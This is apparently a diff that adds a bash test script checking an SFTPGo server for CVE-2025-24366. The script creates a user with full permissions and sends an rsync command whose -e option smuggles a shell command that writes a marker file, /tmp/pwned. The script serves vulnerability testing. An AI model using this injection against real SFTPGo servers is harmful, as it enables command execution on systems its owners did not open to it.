+#!/bin/bash
+
+# This script is to test the vulnerability CVE-2025-24366
+
+# Start SFTPGo
+./sftpgo serve &
+
+# Wait for SFTPGo to start
+sleep 5
+
+# Create a user with rsync enabled
+./sftpgo create user testuser --password testpassword --home-dir /tmp --permissions "*"
+
+# Try to execute a malicious command
+sshpass -p testpassword ssh -p 2022 testuser@localhost rsync -e 'sh -c "touch /tmp/pwned"' /tmp /tmp
+
+# Check if the malicious command was executed
+if [ -f "/tmp/pwned" ]; then
+    echo "Vulnerability Confirmed"
+else
+    echo "Vulnerability Mitigated"
+fi
+
+# Stop SFTPGo
+killall sftpgo

